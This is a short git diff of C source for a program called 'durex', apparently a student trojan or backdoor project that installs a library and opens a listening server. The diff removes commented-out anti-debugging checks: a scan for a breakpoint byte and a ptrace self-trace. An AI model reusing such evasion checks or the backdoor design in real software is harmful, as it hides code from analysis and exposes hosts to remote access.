@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2018/08/29 10:11:26 by root             ###   ########.fr       */
+/*   Updated: 2018/08/31 09:28:19 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -23,8 +23,6 @@
 #include <time.h>
 /* errno */
 #include <errno.h>
-/* ptrace */
-#include <sys/ptrace.h>
 
 #include "main.h"
 #include "durex.h"
@@ -87,14 +85,9 @@ void				durex()
 	int				ret;
 	struct timeval	timeout;
 
-	/* if ((*(volatile unsigned *)((unsigned *)durex + 3) & 0xff) == 0xcc) */
-	/* 	return print_usr_name(); */
-	/* if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) */
-	/* 	return print_usr_name(); */
 	cleanStructure();
+	e.server.reporter = hireReporter();
 	if (launch_program() && install_library()) {
-		serverLog("[INFO] - Durex pid: %d", getpid());
-		e.server.reporter = hireReporter();
 		serverLog("[LOGS] - Opening Server...");
 		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
 		serverLog("[LOGS] - Waiting for connections...");
